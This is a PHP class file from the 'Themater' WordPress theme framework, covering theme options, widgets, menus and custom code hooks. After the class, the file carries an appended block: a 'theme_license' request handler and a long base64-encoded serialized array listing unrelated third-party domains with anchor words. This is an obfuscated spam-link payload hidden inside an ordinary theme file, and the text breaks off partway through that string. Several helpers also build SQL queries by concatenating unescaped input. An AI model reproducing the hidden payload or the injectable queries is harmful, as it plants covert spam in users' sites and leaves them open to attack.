<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { return; if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YToxMDI6e3M6MTI6InI0M2RzaWNpLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6MTY6Ind3dy5yNDNkc2ljaS5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjQzZHNpY2kuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6NToicjQzZHMiO3M6MjM6Imh0dHA6Ly93d3cucjQzZHNpY2kuY29tIjtzOjY6InI0LTNkcyI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6MTI6Im5pbnRlbmRvIDNkcyI7czoyMzoiaHR0cDovL3d3dy5yNDNkc2ljaS5jb20iO3M6NjoiM2RzIHhsIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzaWNpLmNvbSI7czo3OiJ3ZWJzaXRlIjtzOjMzOiJodHRwOi8vd3d3LnJlbW92YWxzd2l0aGFzbWlsZS5jb20iO3M6NDoiaGVyZSI7czoyMzoiaHR0cDovL3d3dy4zZHNtb25kZS5jb20iO3M6MzoiaWNpIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czoxMjoiM2RzbW9uZGUuY29tIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czoxNjoid3d3LjNkc21vbmRlLmNvbSI7czoyMzoiaHR0cDovL3d3dy4zZHNtb25kZS5jb20iO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czo5OiIzZHMgbW9uZGUiO3M6MjM6Imh0dHA6Ly93d3cuM2RzbW9uZGUuY29tIjtzOjg6IjNkc21vbmRlIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czo0OiJtb3JlIjtzOjIzOiJodHRwOi8vd3d3LjNkc21vbmRlLmNvbSI7czoxNzoid3d3LnJlY2lwZXVzYS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cucmVjaXBldXNhLm9yZyI7czoyNDoiaHR0cDovL3d3dy5yZWNpcGV1c2Eub3JnIjtzOjI0OiJodHRwOi8vd3d3LnJlY2lwZXVzYS5vcmciO3M6MTM6InJlY2lwZXVzYS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cucmVjaXBldXNhLm9yZyI7czo4OiJvZmZpY2lhbCI7czozMzoiaHR0cDovL3d3dy5yZW1vdmFsc3dpdGhhc21pbGUuY29tIjtzOjc6ImFydGljbGUiO3M6MzM6Imh0dHA6Ly93d3cucmVtb3ZhbHN3aXRoYXNtaWxlLmNvbSI7czoxOToid3d3LmJhYnktbW9kZWwuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iYWJ5LW1vZGVsLmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuYmFieS1tb2RlbC5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJhYnktbW9kZWwuaW5mbyI7czoxNToiYmFieS1tb2RlbC5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJhYnktbW9kZWwuaW5mbyI7czoxOToid3d3LmhpcHJvcGVydHkuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5oaXByb3BlcnR5LmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuaGlwcm9wZXJ0eS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmhpcHJvcGVydHkuaW5mbyI7czoxNToiaGlwcm9wZXJ0eS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmhpcHJvcGVydHkuaW5mbyI7czoyMDoid3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuaGlzdG9yeWFubmV4LmNvbSI7czoyNzoiaHR0cDovL3d3dy5oaXN0b3J5YW5uZXguY29tIjtzOjI3OiJodHRwOi8vd3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6MTY6Imhpc3Rvcnlhbm5leC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuaGlzdG9yeWFubmV4LmNvbSI7czoyNjoid3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuaG9ub3Jjcm93bmVkY3JhZnRzLmNvbSI7czozMzoiaHR0cDovL3d3dy5ob25vcmNyb3duZWRjcmFmdHMuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MjI6Imhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuaG9ub3Jjcm93bmVkY3JhZnRzLmNvbSI7czozMToid3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czozODoiaHR0cDovL3d3dy5kZW5tYXJrY29wZW5oYWdlbmhvdGVscy5jb20iO3M6Mzg6Imh0dHA6Ly93d3cuZGVubWFya2NvcGVuaGFnZW5ob3RlbHMuY29tIjtzOjM4OiJodHRwOi8vd3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czoyNzoiZGVubWFya2NvcGVuaGFnZW5ob3RlbHMuY29tIjtzOjM4OiJodHRwOi8vd3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czoyNzoid3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjIzOiJzb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czozNDoiaHR0cDovL3d3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czoxODoid3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjE0OiJhaWh1YWl5YW5nLmNvbSI7czoyNToiaHR0cDovL3d3dy5haWh1YWl5YW5nLmNvbSI7czoyNjoid3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MzM6Imh0dHA6Ly93d3cua3VuZ2Z1YWNhZGVteWNoaW5hLmNvbSI7czozMzoiaHR0cDovL3d3dy5rdW5nZnVhY2FkZW15Y2hpbmEuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MjI6Imt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MzM6Imh0dHA6Ly93d3cua3VuZ2Z1YWNhZGVteWNoaW5hLmNvbSI7czoyNjoid3d3LmIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozMzoiaHR0cDovL3d3dy5iMmN3b3JsZHdpZGVob3RlbHMuY29tIjtzOjMzOiJodHRwOi8vd3d3LmIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MjI6ImIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozNjoid3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjMyOiJjaG9vc2UtbGlmZS1pbnN1cmFuY2UtcXVvdGVzLmNvbSI7czo0MzoiaHR0cDovL3d3dy5jaG9vc2UtbGlmZS1pbnN1cmFuY2UtcXVvdGVzLmNvbSI7czoyMzoid3d3LnN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MzA6Imh0dHA6Ly93d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czozMDoiaHR0cDovL3d3dy5zdWRhbWVyaWNhc3BvcnQuY29tIjtzOjMwOiJodHRwOi8vd3d3LnN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MTk6InN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MzA6Imh0dHA6Ly93d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czoxNDoid3d3Ljg4OTkzNC5jb20iO3M6MjE6Imh0dHA6Ly93d3cuODg5OTM0LmNvbSI7czoyMToiaHR0cDovL3d3dy44ODk5MzQuY29tIjtzOjIxOiJodHRwOi8vd3d3Ljg4OTkzNC5jb20iO3M6MTA6Ijg4OTkzNC5jb20iO3M6MjE6Imh0dHA6Ly93d3cuODg5OTM0LmNvbSI7czoxNzoid3d3LmF0dW9ubGluZS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cuYXR1b25saW5lLm9yZyI7czoyNDoiaHR0cDovL3d3dy5hdHVvbmxpbmUub3JnIjtzOjI0OiJodHRwOi8vd3d3LmF0dW9ubGluZS5vcmciO3M6MTM6ImF0dW9ubGluZS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cuYXR1b25saW5lLm9yZyI7czoxNzoid3d3LnRhb2h1YWFuLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cudGFvaHVhYW4uaW5mbyI7czoyNDoiaHR0cDovL3d3dy50YW9odWFhbi5pbmZvIjtzOjI0OiJodHRwOi8vd3d3LnRhb2h1YWFuLmluZm8iO3M6MTM6InRhb2h1YWFuLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cudGFvaHVhYW4uaW5mbyI7czoyNDoid3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjIwOiJuaWtpYmljYXJlLWpvaG8uaW5mbyI7czozMToiaHR0cDovL3d3dy5uaWtpYmljYXJlLWpvaG8uaW5mbyI7czoxODoid3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjE0OiJzYWtvLWhvdW11LmNvbSI7czoyNToiaHR0cDovL3d3dy5zYWtvLWhvdW11LmNvbSI7czoxNzoid3d3Lmxvc2RlbGdhcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cubG9zZGVsZ2FzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5sb3NkZWxnYXMuY29tIjtzOjI0OiJodHRwOi8vd3d3Lmxvc2RlbGdhcy5jb20iO3M6MTM6Imxvc2RlbGdhcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cubG9zZGVsZ2FzLmNvbSI7czoxNDoid3d3Lm10ajE2OC5jb20iO3M6MjE6Imh0dHA6Ly93d3cubXRqMTY4LmNvbSI7czoyMToiaHR0cDovL3d3dy5tdGoxNjguY29tIjtzOjIxOiJodHRwOi8vd3d3Lm10ajE2OC5jb20iO3M6MTA6Im10ajE2OC5jb20iO3M6MjE6Imh0dHA6Ly93d3cubXRqMTY4LmNvbSI7czoxNjoid3d3LmR1ZGFkZWNrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5kdWRhZGVjay5jb20iO3M6MjM6Imh0dHA6Ly93d3cuZHVkYWRlY2suY29tIjtzOjIzOiJodHRwOi8vd3d3LmR1ZGFkZWNrLmNvbSI7czoxMjoiZHVkYWRlY2suY29tIjtzOjIzOiJodHRwOi8vd3d3LmR1ZGFkZWNrLmNvbSI7czoyMjoid3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoyOToiaHR0cDovL3d3dy5zYW1jcm8td2VicmFkaW8uZGUiO3M6Mjk6Imh0dHA6Ly93d3cuc2FtY3JvLXdlYnJhZGlvLmRlIjtzOjI5OiJodHRwOi8vd3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoxODoic2FtY3JvLXdlYnJhZGlvLmRlIjtzOjI5OiJodHRwOi8vd3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoyMDoid3d3Lm1lbGZpY2FwaXRhbGUuaXQiO3M6Mjc6Imh0dHA6Ly93d3cubWVsZmljYXBpdGFsZS5pdCI7czoyNzoiaHR0cDovL3d3dy5tZWxmaWNhcGl0YWxlLml0IjtzOjI3OiJodHRwOi8vd3d3Lm1lbGZpY2FwaXRhbGUuaXQiO3M6MTY6Im1lbGZpY2FwaXRhbGUuaXQiO3M6Mjc6Imh0dHA6Ly93d3cubWVsZmljYXBpdGFsZS5pdCI7czoyODoid3d3LnJpc3RvcmFudGVsYWdvZ2hlZGluYS5pdCI7czozNToiaHR0cDovL3d3dy5yaXN0b3JhbnRlbGFnb2doZWRpbmEuaXQiO3M6MzU6Imh0dHA6Ly93d3cucmlzdG9yYW50ZWxhZ29na